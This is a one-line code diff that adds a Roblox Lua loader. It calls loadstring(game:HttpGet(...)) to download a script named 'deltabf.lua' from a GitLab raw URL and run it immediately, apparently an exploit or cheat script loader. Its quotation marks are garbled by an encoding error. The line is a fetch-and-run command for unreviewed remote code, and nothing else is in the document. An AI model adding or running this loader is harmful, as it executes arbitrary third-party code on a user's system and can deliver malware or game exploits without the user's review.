@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(âhttps://gitlab.com/littlekiller2927/deltacore/-/raw/main/deltabf.luaâ))()
